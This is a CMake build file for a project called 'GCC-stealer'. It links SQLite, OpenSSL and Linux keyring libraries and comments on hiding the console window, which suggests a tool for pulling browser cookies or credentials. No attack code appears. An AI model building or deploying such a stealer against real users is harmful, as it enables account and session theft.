cmake_minimum_required(VERSION 3.20)

if(POLICY CMP0091)
    cmake_policy(SET CMP0091 NEW) # Enables use of MSVC_RUNTIME_LIBRARY
endif()

project(GCC-stealer)

if (!CMAKE_TOOLCHAIN_FILE)
    message(FATAL_ERROR "Use vcpkg along with -DCMAKE_TOOLCHAIN_FILE=[vcpkg-root]/scripts/buildsystems/vcpkg.cmake")
endif()

find_package(unofficial-sqlite3 CONFIG REQUIRED)
find_package(jsoncons CONFIG REQUIRED)
find_package(OpenSSL REQUIRED)
find_package(argparse CONFIG REQUIRED)

set(GCC-stealer_SOURCE_FILES
    src/GCC-stealer.cpp
    src/base64.hpp
)

if((${CMAKE_SYSTEM_NAME} MATCHES "Windows") AND (${CMAKE_BUILD_TYPE} MATCHES "Release"))
    #WIN32 option to hide console: https://cmake.org/pipermail/cmake/2003-July/004047.html
    add_executable(GCC-stealer ${GCC-stealer_SOURCE_FILES})
        
else()
    add_executable(GCC-stealer ${GCC-stealer_SOURCE_FILES})
    set(BUILD_SHARED_LIBS OFF)
    set(CMAKE_EXE_LINKER_FLAGS "-static")
endif()

target_compile_features(GCC-stealer PRIVATE cxx_std_17)

target_link_libraries(GCC-stealer PRIVATE unofficial::sqlite3::sqlite3 jsoncons)
target_link_libraries(GCC-stealer PRIVATE OpenSSL::SSL OpenSSL::Crypto)
target_link_libraries(GCC-stealer PRIVATE argparse::argparse)

if(${CMAKE_SYSTEM_NAME} MATCHES "Windows")
    set_target_properties(GCC-stealer PROPERTIES MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
    set_property(DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR} PROPERTY VS_STARTUP_PROJECT GCC-stealer)
elseif(${CMAKE_SYSTEM_NAME} MATCHES "Linux")
    # find_package(PkgConfig REQUIRED)
    # pkg_check_modules(Libsecret REQUIRED IMPORTED_TARGET libsecret-1)

    target_include_directories(GCC-stealer PRIVATE ${LIBSECRET_INCLUDE_DIRS})

    # Get the path where the vcpkg installed libs live
    get_filename_component(VCPKG_LIBS_PATH ${OPENSSL_SSL_LIBRARY} DIRECTORY)

    target_include_directories(GCC-stealer PRIVATE "${OPENSSL_INCLUDE_DIR}/libsecret-1/")
    target_include_directories(GCC-stealer PRIVATE "${OPENSSL_INCLUDE_DIR}/glib-2.0")
    target_include_directories(GCC-stealer PRIVATE "${VCPKG_LIBS_PATH}/glib-2.0/include")

    #message(STATUS ${LIBSECRET_LIBRARIES})
    
    #target_link_libraries(GCC-stealer PRIVATE PkgConfig::Libsecret)

    target_link_directories(GCC-stealer PRIVATE ${VCPKG_LIBS_PATH})
    target_link_libraries(GCC-stealer PRIVATE secret-1 gcrypt  gpg-error stdc++fs dl gio-2.0 pthread z gmodule-2.0 gobject-2.0 glib-2.0 pcre2-8 ffi intl)
elseif(${CMAKE_SYSTEM_NAME} MATCHES "Darwin")
    # ToDo
endif()

if (MSVC_VERSION GREATER_EQUAL "1900")
    include(CheckCXXCompilerFlag)
    CHECK_CXX_COMPILER_FLAG("/std:c++latest" _cpp_latest_flag_supported)
    if (_cpp_latest_flag_supported)
        target_compile_options(GCC-stealer PUBLIC "/std:c++latest")
    endif()
endif()
